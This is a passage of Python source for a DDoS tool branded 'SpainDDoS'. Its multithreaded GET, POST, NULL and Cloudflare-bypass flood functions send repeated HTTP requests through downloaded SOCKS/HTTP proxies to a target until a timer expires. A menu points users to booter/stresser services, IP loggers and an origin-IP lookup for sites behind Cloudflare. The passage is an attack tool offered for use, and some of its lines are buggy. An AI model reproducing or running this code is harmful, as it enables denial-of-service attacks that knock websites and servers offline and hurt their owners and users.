    get_host = "GET " + path + "?" + random_data() + " HTTP/1.1\r\nHost: " + target + "\r\n"
    request = get_host + header
    event.wait()
    while time.time() < timer:
        try:
            s = socks.socksocket()
            if socks_type == 4:
                s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
            if socks_type == 5:
                s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            if socks_type == 1:
                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.connect((str(target), int(port)))
            if protocol == "https":
                ctx = ssl.SSLContext()
                s.DEFAULT_CIPHERS = "TLS_AES_256_GCM_SHA384:ECDHE-ECDSA-AES256-SHA384"
                s = ctx.wrap_socket(s, server_hostname=target)
                cfscrape.create_scraper()
            try:
                sleep(1.5)
                for _ in range(multiple):
                    s.send(str.encode(request))
            except:
                s.close()
        except:
            s.close()



def spammer(event, socks_type):
    header = Headers("post")
    proxy = Choice(proxies).strip().split(":")
    post_host = "POST " + path + " HTTP/1.1\r\nHost: " + target + "\r\n"
    request = post_host + header
    event.wait()
    while time.time() < timer:
        try:
            s = socks.socksocket()
            if socks_type == 4:
                s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
            if socks_type == 5:
                s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            if socks_type == 1:
                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
            s.setsockopt(socket.IPPROTO_TCP,socket.TCP_NODELAY, 1)
            s.connect((str(target), int(port)))
            if protocol == "https":
                ctx = ssl.SSLContext()
                ctx.maximum_version()
                ctx.get_ca_certs = True
                ctx.post_handshake_auth = True
                s = ctx.wrap_socket(s, server_hostname=target,do_handshake_on_connect=True)
            try:
                sleep(2)
                for _ in range(multiple):
                    s.sendall(str.encode(request))
            except:
                s.close()
        except:
            s.close()
            
def null(event, socks_type):
    proxy = Choice(proxies).strip().split(":")
    header = Headers("null")
    get_host = "GET " + path + "?" + random_data() + " HTTP/1.1\r\nHost: " + target + "\r\n"
    request = get_host + header
    event.wait()
    while time.time() < timer:
        try:
            s = socks.socksocket()
            if socks_type == 4:
                s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
            if socks_type == 5:
                s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            if socks_type == 1:
                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.connect((str(target), int(port)))
            if protocol == "https":
                ctx = ssl.SSLContext()
                s = ctx.wrap_socket(s, server_hostname=target)
            try:
                for _ in range(multiple):
                    s.send(str.encode(request))
            except:
                s.close()
        except:
            s.close()                        

def postv2(event, socks_type):
    request = Headers("post")
    proxy = Choice(proxies).strip().split(":")
    event.wait()
    while time.time() < timer:
        try:
            s = socks.socksocket()
            if socks_type == 4:
                s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
            if socks_type == 5:
                s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            if socks_type == 1:
                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.connect((str(target), int(port)))
            if protocol == "https":
                ctx = ssl.SSLContext()
                s = ctx.wrap_socket(s, server_hostname=target)
            try:
                for _ in range(multiple):
                    s.sendall(str.encode(request))
            except:
                s.close()
                proxy = Choice(proxies).strip().split(":")
        except:
            s.close()
            proxy = Choice(proxies).strip().split(":")

def getv2(event, socks_type):
    header = Headers("get")
    proxy = Choice(proxies).strip().split(":")
    get_host = "GET " + path + " HTTP/1.1\r\nHost: " + target + "\r\n"
    request = get_host + header
    event.wait()
    while time.time() < timer:
        try:
            s = socks.socksocket()
            if socks_type == 4:
                s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
            if socks_type == 5:
                s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            if socks_type == 1:
                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY,1)
            s.connect((str(target), int(port)))
            if protocol == "https":
                ctx = ssl.SSLContext()
                s = ctx.wrap_socket(s, server_hostname=target)
            try:
                sleep(2)
                for _ in range(multiple):
                    s.sendall(str.encode(request))
            except:
                s.close()
        except:
            s.close()


def cfb(event, socks_type):
    header = Headers("get")
    proxy = Choice(proxies).strip().split(":")
    get_host = "GET " + path + "?" + random_data() + " HTTP/1.1\r\nHost: " + target + "\r\n"
    request = get_host + header
    event.wait()
    s = socks.socksocket()
    while time.time() < timer:
        try:
            s = socks.socksocket()
            if socks_type == 4:
                s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
            if socks_type == 5:
                s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            if socks_type == 1:
                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.connect((str(target), int(port)))
            if protocol == "https":
                ctx = ssl.SSLContext()
                s.DEFAULT_CIPHERS = "TLS_AES_256_GCM_SHA384:ECDHE-ECDSA-AES256-SHA384"
                s = ctx.wrap_socket(s, server_hostname=target)
                cfscrape.create_scraper(sess=None)
            try:
                sleep(1.5)
                for _ in range(multiple):
                    s.sendall(str.encode(request))
            except:
                s.close()
        except:
            s.close()



def cfbc(event, socks_type):
    request = Headers("cfb")
    event.wait()
    while time.time() < timer:
        try:
            s = socks.socksocket()
            if socks_type == 4:
                s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
            if socks_type == 5:
                s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            if socks_type == 1:
                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.connect((str(target), int(port)))
            if protocol == "https":
                ctx = ssl.SSLContext()
                s = ctx.wrap_socket(s, server_hostname=target)
            try:
                for _ in range(multiple):
                    s.sendall(str.encode(request))
            except:
                s.close()
        except:
            s.close()


def post(event, socks_type):
    request = Headers("post")
    proxy = Choice(proxies).strip().split(":")
    event.wait()
    while time.time() < timer:
        try:
            s = socks.socksocket()
            if socks_type == 4:
                s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
            if socks_type == 5:
                s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            if socks_type == 1:
                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.connect((str(target), int(port)))
            if protocol == "https":
                ctx = ssl.SSLContext()
                s = ctx.wrap_socket(s, server_hostname=target)
            try:
                for _ in range(multiple):
                    s.sendall(str.encode(request))
            except:
                s.close()
        except:
            s.close()

def checking(lines, socks_type, ms):
    global nums, proxies
    proxy = lines.strip().split(":")
    if len(proxy) != 2:
        proxies.remove(lines)
        return
    err = 0
    while True:
        if err == 3:
            proxies.remove(lines)
            break
        try:
            s = socks.socksocket()
            if socks_type == 4:
                s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
            if socks_type == 5:
                s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            if socks_type == 1:
                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
            s.settimeout(ms)
            s.connect((str(target), int(port)))
            if protocol == "https":
                ctx = ssl.SSLContext()
                s = ctx.wrap_socket(s, server_hostname=target)
            s.send(str.encode("GET / HTTP/1.1\r\n\r\n"))
            s.close()
            break
        except:
            err += 1
    nums += 1


nums = 0


def check_socks(ms):
    global nums
    thread_list = []
    for lines in list(proxies):
        if choice == "5":
            th = threading.Thread(target=checking, args=(lines, 5, ms,))
            th.start()
        if choice == "4":
            th = threading.Thread(target=checking, args=(lines, 4, ms,))
            th.start()
        if choice == "1":
            th = threading.Thread(target=checking, args=(lines, 1, ms,))
            th.start()
        thread_list.append(th)
        sleep(0.01)
    for th in list(thread_list):
        th.join()
    ans = "y"
    if ans == "y" or ans == "":
        if choice == "4":
            with open(out_file, 'wb') as fp:
                for lines in list(proxies):
                    fp.write(bytes(lines, encoding='utf8'))
            fp.close()
        elif choice == "5":
            with open(out_file, 'wb') as fp:
                for lines in list(proxies):
                    fp.write(bytes(lines, encoding='utf8'))
            fp.close()
        elif choice == "1":
            with open(out_file, 'wb') as fp:
                for lines in list(proxies):
                    fp.write(bytes(lines, encoding='utf8'))
            fp.close()


def check_list(socks_file):
    temp = open(socks_file).readlines()
    temp_list = []
    for i in temp:
        if i not in temp_list:
            if ':' in i:
                temp_list.append(i)
    rfile = open(socks_file, "wb")
    for i in list(temp_list):
        rfile.write(bytes(i, encoding='utf-8'))
    rfile.close()


def downloadsocks(choice):
    global out_file
    if choice == "4":
        f = open(out_file, 'wb')
        try:
            r = requests.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=socks4&country=all",
                             timeout=5)
            f.write(r.content)
        except:
            pass
        try:
            r = requests.get("https://www.proxy-list.download/api/v1/get?type=socks4", timeout=5)
            f.write(r.content)
        except:
            pass
        try:
            r = requests.get("https://www.proxyscan.io/download?type=socks4", timeout=5)
            f.write(r.content)
        except:
            pass
        try:
            r = requests.get(
                "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
                timeout=5)
            f.write(r.content)
        except:
            pass
        try:
            r = requests.get("https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt", timeout=5)
            f.write(r.content)
            f.close()
        except:
            f.close()
        try:

            req = requests.get("https://www.socks-proxy.net/", timeout=5, headers={"User-Agent", UserAgent}).text
            part = str(req)
            part = part.split("<tbody>")
            part = part[1].split("</tbody>")
            part = part[0].split("<tr><td>")
            proxies = ""
            for proxy in part:
                proxy = proxy.split("</td><td>")
                try:
                    proxies = proxies + proxy[0] + ":" + proxy[1] + "\n"
                except:
                    pass
                out_file = open(out_file, "a")
                out_file.write(proxies)
                out_file.close()
        except:
            pass
    if choice == "5":
        f = open(out_file, 'wb')
        try:
            r = requests.get("https://raw.githubusercontent.com/FortniBloxYT1/FortniBloxYT1/main/socks5.txt", timeout=5)
            f.write(r.content)
        except:
            pass
        try:
            r = requests.get("https://www.proxyscan.io/download?type=socks5", timeout=5)
            f.write(r.content)
        except:
            pass
        try:
            r = requests.get("https://www.proxy-list.download/api/v1/get?type=socks5", timeout=5)
            f.write(r.content)
        except:
            pass
        try:
            r = requests.get("https://raw.githubusercontent.com/roma8ok/proxy-list/main/proxy-list-socks5.txt", timeout=5)
            f.write(r.content)
        except:
            pass
        try:
            r = requests.get("https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS5_RAW.txt", timeout=5)
            f.write(r.content)
        except:
            pass
        try:
            r = requests.get("https://raw.githubusercontent.com/mmpx12/proxy-list/master/socks5.txt", timeout=5)
            f.write(r.content)
        except:
            pass
        try:
            r = requests.get("https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks5.txt", timeout=5)
            f.write(r.content)
        except:
            pass
        try:
            r = requests.get("https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt", timeout=5)
            f.write(r.content)
        except:
            pass
        try:
            r = requests.get("https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt", timeout=5)
            f.write(r.content)
            f.close()
        except:
            f.close()
    if choice == "1":
        f = open(out_file, 'wb')
        try:
            r = requests.get("https://raw.githubusercontent.com/FortniBloxYT1/FortniBloxYT1/main/httpsock.txt", timeout=5)
            f.write(r.content)
        except:
            pass
        try:
            r = requests.get("https://www.proxyscan.io/download?type=http", timeout=5)
            f.write(r.content)
        except:
            pass
        try:
            r = requests.get("https://www.proxy-list.download/api/v1/get?type=http", timeout=5)
            f.write(r.content)
        except:
            pass
        try:
            r = requests.get("https://www.proxy-list.download/api/v1/get?type=https", timeout=5)
            f.write(r.content)
        except:
            pass
        try:
            r = requests.get("https://raw.githubusercontent.com/Volodichev/proxy-list/main/http.txt", timeout=5)
            f.write(r.content)
        except:
            pass
        try:
            r = requests.get("https://raw.githubusercontent.com/roma8ok/proxy-list/main/proxy-list-http.txt", timeout=5)
            f.write(r.content)
        except:
            pass
        try:
            r = requests.get("https://raw.githubusercontent.com/roma8ok/proxy-list/main/proxy-list-https.txt", timeout=5)
            f.write(r.content)
        except:
            pass
        try:
            r = requests.get("https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt", timeout=5)
            f.write(r.content)
        except:
            pass
        try:
            r = requests.get("https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/https.txt", timeout=5)
            f.write(r.content)
        except:
            pass
        try:
            r = requests.get("https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt", timeout=5)
            f.write(r.content)
        except:
            pass
        try:
            r = requests.get("https://raw.githubusercontent.com/mmpx12/proxy-list/master/http.txt", timeout=5)
            f.write(r.content)
        except:
            pass
        try:
            r = requests.get("https://raw.githubusercontent.com/mmpx12/proxy-list/master/https.txt", timeout=5)
            f.write(r.content)
        except:
            pass
        try:
            r = requests.get("https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http%2Bhttps.txt", timeout=5)
            f.write(r.content)
        except:
            pass
        try:
            r = requests.get("https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt", timeout=5)
            f.write(r.content)
        except:
            pass
        try:
            r = requests.get("https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt", timeout=5)
            f.write(r.content)
            f.close()
        except:
            f.close()
def main():
    global proxies, multiple, choice, timer, out_file
    method = str(sys.argv[1]).lower()
    
    out_file = str("files/proxys/" + sys.argv[5])
    if not os.path.exists(out_file):
        makefile(out_file)

    if method == "check":
        proxydl(out_file, socks_type)
        exit()
    if method == "stop":
        url = str(sys.argv[2]).strip()
        UrlFixer(url)
        stop()
    elif (method == "help") or (method == "h"):
        usge()
    elif (method == "check"):
        pass
    elif str(method.upper()) not in str(methods):
        print("method not found")
        exit()
    timer = int(time.time()) + int(sys.argv[7])
    url = str(sys.argv[2]).strip()
    UrlFixer(url)
    choice = str(sys.argv[3]).strip()
    if choice != "4" and choice != "5" and choice != "1":
        print("Socks Type Not Found [4, 5, 1]")
        exit()
    if choice == "4":
        socks_type = 4
    elif choice == "1":
        socks_type = 1
    else:
        socks_type = 5
    threads = int(sys.argv[4])
    proxies = open(out_file).readlines()
    if method == "slow":
        conn = threads
        proxydl(out_file, socks_type)
        print("{} Attack Started To {}:{} For {} Seconds With {}/{} Proxy ".format(method, target, port, sys.argv[7],len(proxies), str(nums)))

        for _ in range(conn):
            threading.Thread(target=slow, args=(conn, socks_type), daemon=True).start()
    else:
        multiple = str((sys.argv[6]))
        if multiple == "":
            multiple = int(100)
        else:
            multiple = int(multiple)
        event = threading.Event()
        start_attack(method, threads, event, socks_type)
        event.clear()
        event.set()
    while True:
        try:
            sleep(0.1)
        except KeyboardInterrupt:
            break


def proxydl(out_file, socks_type):
    global proxies, multiple, choice, data
    ms = 1
    if socks_type == 1:
        socktyper = "HTTP"
    if socks_type == 4:
        socktyper = "SOCKS4"
    if socks_type == 5:
        socktyper = "SOCKS5"
    os.system('ulimit -n 999999 && ulimit -n 999999 && ulimit -n 999999 && ulimit -n 999999 && ulimit -n 999999 && ulimit -n 999999 && clear && clear')
    print(color.RED  + "          ╔═════════════════════════════════════════╗"+ color.END) 
    print(color.RED  + "            ╔════╗           ╔╗ ╔═══╗          ╔╗   "+ color.END) 
    print(color.RED  + "            ║╔╗╔╗║          ╔╝╚╗║╔═╗║          ║║   "+ color.END) 
    print(color.RED  + "            ╚╝║║╠╩╦══╦══╦══╦╩╗╔╝║╚══╦══╦╗╔╦══╦═╝║   "+ color.END) 
    print(color.RED  + "              ║║║╔╣╔╗║╔═╣ ═╣╔╣║ ╚══╗║╔╗║║║║╔╗║╔╗║   "+ color.END) 
    print(color.RED  + "              ║║║║║╔╗║╚═╣ ═╣║║╚╗║╚═╝║╚╝║╚╝║╔╗║╚╝║   "+ color.END) 
    print(color.RED  + "              ╚╝╚╝╚╝╚╩══╩══╩╝╚═╝╚═══╩═╗╠══╩╝╚╩══╝   " + color.END)        
    print(color.RED  + "                                      ╚╝            " + color.END) 
    print(color.RED  + "          ╚══╦═══════════════════════════════════╦══╝"+ color.END) 
    print(color.RED + "          ╔══╩═══════════════════════════════════╩═╗" + color.END)
    print(color.RED + "          ║   "+ color.END + color.BLUE +             " DOWNLOADING PROXIES PLS WAIT... " + color.END + color.RED + "    ║"+ color.END)
    print(color.RED + "          ╚════════════════════════════════════════╝   " + color.END)
    downloaddd = input("Do you want to download proxys Y/N")
    if downloaddd == "y":
        downloadsocks(choice)
    proxies = open(str(out_file)).readlines()
    checkk = input("Do you want to check proxys Y/N")
    if checkk == "y":
        check_list(out_file)
        check_socks(ms)



bds = 0


# layer tool :||||||||||||
def toolgui():
    global bds
    tos = str(to).replace("'", "").replace("[", "").replace("]", "").replace(",", "\n")
    if bds == 0:
        print('''
     ╔══════════════════════════╗          
     ║  ╔════╦═══╦═══╦╗  ╔═══╗  ║
     ║  ║╔╗╔╗║╔═╗║╔═╗║║  ║╔═╗║  ║
     ║  ╚╝║║╚╣║ ║║║ ║║║  ║╚══╗  ║
     ║    ║║ ║║ ║║║ ║║║ ╔╬══╗║  ║
     ║    ║║ ║╚═╝║╚═╝║╚═╝║╚═╝║  ║
     ║    ╚╝ ╚═══╩═══╩═══╩═══╝  ║
     ╚═╦═════════════════════╦══╝         
  ╔════╩═════════════════════╩═════╗        
  ║  •myip            •stresser    ║
  ║                                ║
  ║  •ProxyList       •fivem       ║
  ║                                ║
  ║  •iplogger       •pinger       ║
  ╚════════════════════════════════╝
 ''' + tos+ '''
Other:
 Clear
 Exit
        ''')
    bds = 1
    tool = input(socket.gethostname() + "@"+name+":~# ").lower()
    if tool != "e" and (tool != "exit") and (tool != "q") and (tool != "quit") and (tool != "logout") and (
            tool != "close"):
        pass
    else:
        exit()
    if tool == "cfip":
        domain = input(socket.gethostname() + '@'+name+'}:~/give-me-ipaddress# ')
        cfip(domain)
        return tools()
    elif tool == "dstat":
        return tools()
    elif tool == "dns":
        return tools()
    elif tool == "check":
        domain = input(socket.gethostname() + '@'+name+'}:~/give-me-ipaddress# ')
        check(domain)
        return tools()
    elif tool == "ping":
        domain = input(socket.gethostname() + '@'+name+'}:~/@SpainDDoS press enter')
        piger(domain)
        return tools()
    elif tool == "pinger":
        print("If you going to ping a website,remove the https:// and the paths if is possible")
        IPn = input("Enter IP to ping :")
        os.system("ping -t -l 1 " + IPn )
        if IPn == "":
            print("Please enter a IP to ping :")
            sleep(2)
            os.system("cls")
            print("Please,dont have mistakes writting IP")
            sleep(1.5)
            os.system("cls")
        sleep(1)
        IPn = input("Enter IP to ping :")
        os.system("ping -t -l 1 " + IPn )
    elif tool == "proxylist":
        print("https://proxyscrape.com/free-proxy-list https://openproxy.space/list http://free-proxy.cz/en/proxylist/country/ALL/socks5/ping/all https://hidemy.name/es/proxy-list/ https://freeproxylists.net/")
        length = int(input('\nEnter the length of password: '))
        lower = string.ascii_lowercase
        upper = string.ascii_uppercase
        num = string.digits
        symbols = string.punctuation
        all = lower + upper + num + symbols
        temp = random.sample(all,length)
        password = "".join(temp)
        print(password)
        return tools()
    elif tool == "stresser":
            stresser = input("You need layer7 or layer4 stresser? :")
            if stresser == "layer7" or stresser == "Layer7":
                print("here layer7 stressers: https://booter.cc https://stresser.app https://dragonstresser.com https://booter.sx https://redstresser.cc/ https://anonboot.com  https://cryptostresser.com https://stresser.us/ ")
            if stresser == "layer4" or stresser == "Layer4":
                print("here layer4 stresser: https://ipstress.in https://stresser.ai https://stresslab.sx https://freestresser.to/ https://instant-stresser.com/ https://royalstresser.com/ https://redstresser.cc/ https://cryptostresser.com https://stresslab.sx https://str3ssed.co/")
            if stresser == "":
                print("You need to put Layer7 or Layer4")
                sleep(2)
                os.system("cls")
                stresser = input("You need layer7 or layer4 stresser? :")
            if stresser == "layer7" or stresser == "Layer7":
                print("here layer7 stressers: https://booter.cc https://stresser.app https://dragonstresser.com https://booter.sx https://redstresser.cc/ https://anonboot.com  https://cryptostresser.com https://stresser.us/ ")
            if stresser == "layer4" or stresser == "Layer4":
                print("here layer4 stresser: https://ipstress.in https://stresser.ai https://stresslab.sx https://freestresser.to/ https://instant-stresser.com/ https://royalstresser.com/ https://redstresser.cc/ https://cryptostresser.com https://stresslab.sx https://str3ssed.co/")
                return tools()
    elif tool == "portscan":
        host =  input("IP To Scan :")
        nm = nmap.Portscanner()
        puertos_abiertos="-p"
        count=0
        results = nm.scan(hosts=host, arguments="-sT -n -Pn -T4")
        #print results
        print("\nHost : %s" % host)
        print("State : %s" % nm[host].state())
        for proto in nm [host].all_protocols():
            print("Protocol : %s" % proto)
            print()
            lport = nm[host][proto].keys()
            sorted(lport)
            for port in lport:
                print("port : %s\tstate : %s" %(port, nm[host][proto][port]["state"]))
            if count==0:
                puertos_abiertos= puertos_abiertos+" "+str(port)
                count=1
            else:
                puertos_abiertos= puertos_abiertos+","+str(port)
                print("\nPuertos abiertos:"+puertos_abiertos+" "+str(host))
    elif tool == "fivem":
        print("Enter cfx code here http://cfxfinder.tk/")
        return tools()
    elif tool == "iplogger":
        print("https://grabify.link/register  https://iplogger.org")
        return tools()
    elif tool == "info":
        domain = input(socket.gethostname() + '@'+name+'}:~/give-me-ipaddress# ')
        piger(domain)
    elif tool == "myip" or "myip":
        ip = requests.get("http://ipinfo.io/ip").text

        print("Your IP is: " + ip)
        return tools()
    elif (tool == "help") or (tool == "h") or (tool == "?"):
        tos = str(to).replace("'", "").replace("[", "").replace("]", "").replace(",", "\n")
        print('''
Tools:
pingerv2
passwordgenerator
dstat
portscan
stresser
proxylist
Pinger
WhoIs
MyIP
Fivem
IPlogger
 {tos}
Other:
 Clear
 Exit
        ''')
        return tools()
    elif (tool == "cls") or (tool == 'clear') or (tool == 'c'):
        print("\033[H\033[J")
        return tools()
    elif not tool:
        return tools()

    elif " " in tool:
        return tools()
    elif "        " in tool:
        return tools()
    elif "  " in tool:
        return tools()
    elif "\n" in tool:
        return tools()
    elif "\r" in tool:
        return tools()

    else:
        print(tool + ": command not found")
        return tools()


def tools():
    global domain, name
    name = "SpainDDoS"
    try:
        tool = sys.argv[2].lower()
        if tool != "dstat":
            domain = sys.argv[3]
            if str('.') not in str(domain):
                print('address not found')
                toolgui()
        if tool == "cfip":
            cfip(domain)
        elif tool == "check":
            check(domain)
        elif tool == "fivem resolver" or "fivem":
             print("http://cfxfinder.tk/")
        elif tool == "iplogger" or "IPLogger" or "IPlogger":
            print("https://grabify.link/register  https://iplogger.org")
        elif tool == "ping":
         domain
        elif tool == "proxygenerator":
            print("https://proxyscrape.com/free-proxy-list https://openproxy.space/list http://free-proxy.cz/en/proxylist/country/ALL/socks5/ping/all https://hidemy.name/es/proxy-list/ https://freeproxylists.net/")
            return tools()
        elif tool == "proxyapi":
            print("You can edit the link for other types of proxies...")
            sleep(2)
            API = requests.get("https://api.proxyscrape.com/v2/?request=displayproxies&protocol=https&timeout=500&country=all&ssl=all&anonymity=all")
            print(API)
        else:
            print('tool not found')
            toolgui()
    except IndexError:
        toolgui()


def cfip(domain):
    if str("http") in str(domain):
        domain = domain.replace('https://', '').replace('http:', '').replace('/')
    URL = "http://www.crimeflare.org:82/cgi-bin/cfsearch.cgi"
    r = requests.post(URL, data={"cfS": {domain}}, headers={"User-Agent": UserAgent, }, timeout=1)
    print(r.text)

def proxygenerator():
    print("https://proxyscrape.com/free-proxy-list https://openproxy.space/list http://free-proxy.cz/en/proxylist/country/ALL/socks5/ping/all https://hidemy.name/es/proxy-list/ https://freeproxylists.net/")

def iplogger():
    print("https://grabify.link/register  https://iplogger.org")

def portscanner():
        host =  input("IP To Scan :")
        nm = nmap.Portscanner()
        puertos_abiertos="-p"
        count=0
        results = nm.scan(hosts=host, arguments="-sT -n -Pn -T4")
        #print results
        print("\nHost : %s" % host)
        print("State : %s" % nm[host].state())
        for proto in nm [host].all_protocols():
            print("Protocol : %s" % proto)
            print()
            lport = nm[host][proto].keys()
            sorted(lport)
            for port in lport:
                print("port : %s\tstate : %s" %(port, nm[host][proto][port]["state"]))
            if count==0:
                puertos_abiertos= puertos_abiertos+" "+str(port)
                count=1
            else:
                puertos_abiertos= puertos_abiertos+","+str(port)
                print("\nPuertos abiertos:"+puertos_abiertos+" "+str(host))
def Proxylist():
        print("https://proxyscrape.com/free-proxy-list https://openproxy.space/list http://free-proxy.cz/en/proxylist/country/ALL/socks5/ping/all https://hidemy.name/es/proxy-list/ https://freeproxylists.net/")

def dstat():
    driver = uc.Chrome()
    driver.get("https://dstat.cc")
    driver.get("https://cyber-hub.pw/layer7_home.php")
def check(domain):
    if str("http") not in str(domain):
        domain = "http://" + domain
    print('please wait ...')
    r = requests.get(domain, timeout=20)
    if str("50") in str(r.status_code):
        die = "OFFLINE"
    else:
        die = "ONLINE"
    print('\nstatus_code: '+r.status_code)
    print('status: '+die+'\n')


def piger(siye):
    domain
def usgeaseets():
    global metho, url, SOCKST, thr, proxylist, muli, tim, l7s, l4s, tos, ots, l3s
    socks = ["1", "4", "5"]
    sockst = ["socks4.txt", "socks5.txt", "http.txt"]
    try:
        if sys.argv[3] not in socks:
            SOCKST = Choice(socks)
        elif sys.argv[3]:
            SOCKST = sys.argv[3]

        else:
            SOCKST = Choice(socks)
    except:
        SOCKST = Choice(socks)

    if (str(SOCKST) == str('1')):
        proxylist = "http.txt"
    else:
        proxylist = "socks{0}.txt".format(SOCKST)

    try:
        met = str(sys.argv[1]).upper()
        if met not in list(methods):
            metho = Choice(methods).lower()
        elif sys.argv[1]:
            metho = sys.argv[1]
        else:
            metho = Choice(methods).lower()
    except:
        metho = Choice(methods).lower()
    try:
        methos = metho.upper()
        if (methos in l4) or (methos in l3):
            url = sys.argv[2]
        elif str("http") not in sys.argv[2]:
            url = "https://example.ir"
        elif sys.argv[2]:
            url = sys.argv[2]
        else:
            url = "https://example.ir"
    except:
        url = "https://example.ir"
    try:
        if sys.argv[4]:
            thr = sys.argv[4]
        else:
            thr = Intn(100, 1000)
    except:
        thr = Intn(100, 1000)
    try:
        if (sys.argv[5] not in sockst):
            exit()
    except IndexError:
        pass
    except:
        print('socks type not found')
        exit()

    try:
        if sys.argv[6]:
            muli = sys.argv[6]
        else:
            muli = Intn(10, 150)
    except:
        muli = Intn(10, 150)
    try:
        if sys.argv[7]:
            tim = sys.argv[7]
        else:
            tim = Intn(10, 10000)
    except:
        tim = Intn(10, 10000)

    l4s = str(l4).replace("'", "").replace("[", "").replace("]", "")
    l3s = str(l3).replace("'", "").replace("[", "").replace("]", "")
    l7s = str(l7).replace("'", "").replace("[", "").replace("]", "")
    tos = str(to).replace("'", "").replace("[", "").replace("]", "")
    ots = str(ot).replace("'", "").replace("[", "").replace("]", "")


def usge():
    usgeaseets()
    os.system('ulimit -n 999999 && ulimit -n 999999 && ulimit -n 999999 && ulimit -n 999999 && ulimit -n 999999 && ulimit -n 999999 && clear && clear')
    print ("")
    print(color.BLUE  + "       ╔═════════════════════════════════════════╗"+ color.END) 
    print(color.BLUE  + "       ║  ╔════╗           ╔╗ ╔═══╗          ╔╗  ║"+ color.END) 
    print(color.BLUE  + "       ║  ║╔╗╔╗║          ╔╝╚╗║╔═╗║          ║║  ║"+ color.END) 
    print(color.BLUE  + "       ║  ╚╝║║╠╩╦══╦══╦══╦╩╗╔╝║╚══╦══╦╗╔╦══╦═╝║  ║"+ color.END) 
    print(color.BLUE  + "       ║    ║║║╔╣╔╗║╔═╣ ═╣╔╣║ ╚══╗║╔╗║║║║╔╗║╔╗║  ║"+ color.END) 
    print(color.BLUE  + "       ║    ║║║║║╔╗║╚═╣ ═╣║║╚╗║╚═╝║╚╝║╚╝║╔╗║╚╝║  ║"+ color.END) 
    print(color.BLUE  + "       ║    ╚╝╚╝╚╝╚╩══╩══╩╝╚═╝╚═══╩═╗╠══╩╝╚╩══╝  ║" + color.END)        
    print(color.BLUE  + "       ║                            ╚╝           ║" + color.END) 
    print(color.BLUE  + "       ╚══╦═══════════════════════════════════╦══╝"+ color.END) 
    print(color.BLUE  + "          ║               LAYER 7:            ║"+ color.END) 
    print(color.BLUE  + "   ╔══════╩═══════════════════════════════════╩════════╗"+ color.END) 
    print(color.BLUE  + "   ║      ★ Choose The Methods For The Attack ★        ║"+ color.END) 
    print(color.BLUE  + "   ╠════════════════╦════════════════╦═════════════════╣"+ color.END) 
    print(color.BLUE  + "   ║ •GETV2         ║  •CFUAM        ║   •HTTPFAST     ║"+ color.END)    
    print(color.BLUE  + "   ║ •POST          ║  •CFBV2        ║   •HTTPFASTV2   ║"+ color.END) 
    print(color.BLUE  + "   ║ •NULL          ║  •CFB          ║   •BYPASSV2     ║"+ color.END) 
    print(color.BLUE  + "   ║ •HEAD          ║  •OVH          ║   •BYPASS       ║"+ color.END) 
    print(color.BLUE  + "   ╚════════════════╬════════════════╬═════════════════╝"+ color.END)
    print(color.BLUE  + "                    ║    LAYER 4:    ║"+ color.END)
    print(color.BLUE  + "                 ╔══╩════════════════╩═╗"+ color.END)
    print(color.BLUE  + "                 ║                     ║"+ color.END)
    print(color.BLUE  + "                 ║                     ║"+ color.END)
    print(color.BLUE  + "                 ╚═════════════════════╝"+ color.END)
    
def makefile(text): 
    if text == "files/":
        os.mkdir(text)
    elif text == "files/proxys/":
        os.mkdir(text)
    else:
